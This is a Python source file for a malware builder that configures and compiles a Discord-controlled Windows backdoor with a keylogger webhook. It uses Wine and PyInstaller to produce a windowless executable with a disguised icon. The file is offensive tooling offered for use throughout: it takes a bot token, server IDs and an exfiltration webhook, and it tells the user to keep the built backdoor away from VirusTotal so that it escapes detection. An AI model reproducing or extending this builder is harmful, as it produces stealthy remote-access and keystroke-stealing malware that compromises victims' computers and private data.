import os
import subprocess
import getpass
import requests
from prettytable import PrettyTable
from sys import platform as OS

def clear_screen():
    if OS.startswith("linux"):
        os.system("clear")

def print_banner():
    print(r'''

██████╗  █████╗ ██╗   ██╗██████╗  █████╗ ██╗   ██╗
██╔══██╗██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗╚██╗ ██╔╝
██████╔╝███████║ ╚████╔╝ ██████╔╝███████║ ╚████╔╝ 
██╔══██╗██╔══██║  ╚██╔╝  ██╔══██╗██╔══██║  ╚██╔╝  
██████╔╝██║  ██║   ██║   ██████╔╝██║  ██║   ██║   
╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
                                                v2.0.1
          
Made by vicky aka admin12121 | Github : admin12121
Run 'help use' to get started!
''')

# Payload settings templates

PAYLOAD_SETTINGS = ["Backdoor Name", "Guild ID", "Bot Token", "Channel ID", "Keylogger Webhook"]


def create_table(settings):
    table = PrettyTable(["Setting", "Value"])
    for name, value in zip(PAYLOAD_SETTINGS, settings):
        if name:
            table.add_row([name, value])
    else:
        print("[!] Please select a valid payload!\n")
    return table

def get_pyinstaller_path():
    username = getpass.getuser()
    home = os.path.expanduser('~')
    candidates = [
        os.path.join(home, '.wine64', 'drive_c', 'users', username, 'Local Settings', 'Application Data', 'Programs', 'Python', 'Python38', 'Scripts', 'pyinstaller.exe'),
        os.path.join(home, '.wine64', 'drive_c', 'users', username, 'AppData', 'Local', 'Programs', 'Python', 'Python38', 'Scripts', 'pyinstaller.exe'),
        '/home/kali/.wine64/drive_c/users/kali/AppData/Local/Programs/Python/Python38/Scripts/pyinstaller.exe'
    ]
    for path in candidates:
        if os.path.exists(path):
            return path
    return None

def build_backdoor( settings):    
    template_path = "code/discord/main.py"
    try:
        with open(template_path, 'r') as f:
            file = f.read()
        newfile = file.replace("{GUILD}", str(settings[1]))
        newfile = newfile.replace("{TOKEN}", str(settings[2]))
        newfile = newfile.replace("{CHANNEL}", str(settings[3]))
        newfile = newfile.replace("{KEYLOG_WEBHOOK}", str(settings[4]))
    except Exception as e:
        print(f"[!] Error reading template: {e}")
        return

    filename = f"{settings[0]}.py"
    with open(filename, 'w') as f:
        f.write(newfile)

    # Always build for Windows (Wine + icon)
    pyinstaller_path = get_pyinstaller_path()
    if not pyinstaller_path:
        print("[!] PyInstaller not found in Wine prefix. Please ensure Python and PyInstaller are installed under Wine.")
        return
    compile_command = [
        "wine", pyinstaller_path, "--onefile", "--noconsole", "--icon=img/exe_file.ico", filename
    ]

    subprocess.call(compile_command)
    for ext in [".py", ".spec"]:
        try:
            os.remove(settings[0] + ext)
        except FileNotFoundError:
            pass
    print('\n[+] The Backdoor can be found inside the "dist" directory')
    print('\nDO NOT UPLOAD THE BACKDOOR TO VIRUS TOTAL')


def print_help(command=None):
    if not command:
        print('''
Help Menu:
help                Show this menu
set <setting> <val> Set a value for a setting
config              Show current settings
build               Build the Discord backdoor (Windows)
exit                Exit the builder
''')
    elif command == "set":
        print('''
Help Menu:
"set <setting> <value>" Sets a value to a valid setting
Settings:
"name" - The name of the backdoor
"guild-id" - The ID of the Discord server
"bot-token" - The token of the Discord bot
"channel-id" - The ID of the Discord channel
"webhook" - The webhook for the keylogger
''')
    elif command == "config":
        print('''
Help Menu:
"config" Displays the current settings for the backdoor
''')
    elif command == "build":
        print('''
Help Menu:
"build" Builds the Discord backdoor with the current settings
Make sure to set all settings before building.
''')

def main():
    clear_screen()
    print_banner()

    settings = ["None"] * 5

    while True:
        try:
            command = input(f"[+] discord > ").strip()
            if not command:
                continue
            command_list = command.split()
            cmd = command_list[0].lower()

            if cmd == "exit":
                print("\n[+] Exiting!")
                break

            elif cmd == "help":
                if len(command_list) == 1:
                    print_help()
                else:
                    print_help(command_list[1].lower())
                    
            elif cmd == "set":
                if len(command_list) < 3:
                    print("[!] Please specify a setting!\n")
                    continue

                setting, value = command_list[1].lower(), command_list[2]

                setting_map =  {"name": 0, "guild-id": 1, "bot-token": 2, "channel-id": 3, "webhook": 4}

                if setting in setting_map:
                    settings[setting_map[setting]] = value
                else:
                    print("[!] Invalid setting!\n")

            elif cmd == "config":
                    print(f"\n{create_table(settings).get_string(title='Disctopia Backdoor Settings')}")
                    print("Run 'help set' for more information\n")

            elif cmd == "clear":
                clear_screen()

            elif cmd == "build":
                if "None" in settings:
                    print("[!] Please set all settings before building.")
                    continue
                confirm = input("[?] Are you sure you want to build the backdoor? (y/n): ").strip().lower()
                if confirm == "y" or confirm == "yes":
                    print("[+] Building backdoor...")
                    build_backdoor(settings)
                    break
            else:
                print("[!] Invalid command! Type 'help' for options.")

        except KeyboardInterrupt:
            print("\n\n[+] Exiting")
            break

if __name__ == "__main__":
    main()